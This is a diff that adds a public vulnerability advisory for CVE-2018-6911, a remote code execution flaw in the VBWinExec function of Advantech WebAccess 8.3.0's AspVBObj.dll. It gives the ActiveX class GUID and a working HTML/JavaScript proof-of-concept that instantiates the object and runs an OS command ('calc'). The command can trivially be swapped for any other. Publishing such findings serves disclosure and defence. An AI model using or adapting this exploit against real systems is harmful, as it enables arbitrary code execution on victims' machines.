@@ -1,0 +1,57 @@
+Vulnerability Title: Advantech WebAccess Node8.3.0 "AspVBObj.dll" - Remote Code Execution
+
+Discovered by: Nassim Asrir 
+
+Contact: wassline@gmail.com / https://www.linkedin.com/in/nassim-asrir-b73a57122/
+
+CVE: CVE-2018-6911
+
+Tested on: IE11 / Win10
+
+
+Technical Details:
+==================
+
+The VBWinExec function in Node\AspVBObj.dll in Advantech WebAccess 8.3.0 allows remote attackers to execute arbitrary OS commands via a single argument.
+
+Vulnerable File: C:\WebAccess\Node\AspVBObj.dll
+
+Vulnerable Function: VBWinExec
+
+Vulnerable Class: Include
+
+Class Include
+GUID: {55F52D11-CEA5-4D6C-9912-2C8FA03275CE}
+Number of Interfaces: 1
+Default Interface: _Include
+RegKey Safe for Script: False
+RegkeySafe for Init: False
+KillBitSet: False
+
+The VBWinExec function take one parameter and the user/attacker will be able to control it to execute OS command.
+
+Function VBWinExec (
+ 	ByRef command  As String 
+)
+
+Exploit:
+========
+
+<title>Advantech WebAccess Node8.3.0 "AspVBObj.dll" - Remote Code Execution</title>
+<BODY>
+ <object id=rce classid="clsid:{55F52D11-CEA5-4D6C-9912-2C8FA03275CE}"></object>
+ 
+<SCRIPT>
+ 
+function exploit()
+ {
+     
+     rce.VBWinExec("calc")
+	
+   
+ }
+ 
+</SCRIPT>
+<input language=JavaScript onclick=exploit() type=button value="Exploit-Me"><br>
+</body>
+</HTML>
